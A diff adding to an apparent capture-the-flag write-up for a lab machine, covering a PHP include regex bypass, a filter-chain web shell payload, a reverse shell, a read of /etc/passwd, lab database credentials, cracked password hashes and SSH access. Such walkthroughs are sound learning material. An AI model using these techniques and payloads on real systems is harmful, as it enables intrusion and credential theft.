@@ -163,9 +163,71 @@ the admin visited it, so now we hope he created this new user with admin privele
 done, we are admin!\
 ![alt text](image-29.png)\
 let's look for stuff:\
+so what's new is 2 pages, the settings page and the reports page, let's check the settings page :\
+![alt text](image-30.png)\
+well nothing too interesting, lets check reports:\
+![alt text](image-31.png)\
+let's check each of these, we might find something, well they are graphs, nothing interesting again, what am i supposed to do now??\
+-4AM update, (after ai scanned some source code  XD), as u can see these are files :\
+![alt text](image-32.png)\
+but they its sanitized so u can only access the 4 pages already determined in the source code :
+```
+if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
+    die("<h2>Access denied. Invalid file 🚫</h2>");
+}
 
+```
+so we need to bypass this:\
+so what this does, is only accept files ending in enrollment|academic|financial|system .php, but only "ending" , because of the "*", so we can do path traversal and read other files,
 
+after being stuck for a while, i was nudged by a friend to use filter-chains, what this does is get you ece without uploading a file if you control entirely the parameter passed to a require or an include in php, so let's make it openup a reverse shell:\
+lets test it first:
+```
+python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
+```
+and now after the chain is generated, we add &cmd=.... at the end (which was rev shell code), and there we are, we got a connection:\
+![alt text](image-34.png)\
+lets try to get the user flag now:\
+ok let's try to take the common route :\
+```
+www-data@guardian:~$ cat /etc/passwd | grep -v nologin | grep -v false
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+jamil:x:1000:1000:guardian:/home/jamil:/bin/bash
+mark:x:1001:1001:ls,,,:/home/mark:/bin/bash
+gitea:x:116:123:Git Version Control,,,:/home/gitea:/bin/bash
+sammy:x:1002:1003::/home/sammy:/bin/bash
+```
+alr now since the site was running mysql lets try to get in and look for these 3 users (jamil, mark, sammy) and their password hashes, (if they even exist), and hope that they used the same password...\
+well we don't have the password, but i remember when i was reading the files looking for createuser.php, I did stumble upn a file containing configs or something for mysql, let's find it again (in gitea):\
+yep, config.php:
+```
+<?php
+return [
+    'db' => [
+        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
+        'username' => 'root',
+        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
+        'options' => []
+    ],
+    'salt' => '8Sb)tM1vs1SS'
+];
+```
 
+we got everything, dbname, password, salt let's get their hashes:
+```
+mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st' guardiandb
 
-
-
+```
+so lets read the tables:\
+![alt text](image-35.png)\
+we got the hashes, these are sha256 hashes and we also have the salt, crackable..\
+after going through them in crackstation, 
+i was only able to crack these two users:\
+```
+admin:fakebake000
+jamil.enockson:copperhouse56
+```
+so maybe jamil is our only way in, lets try to ssh in as jamil and hope he used the same password for ssh:\
+![alt text](image-36.png)\
+user flag done !\
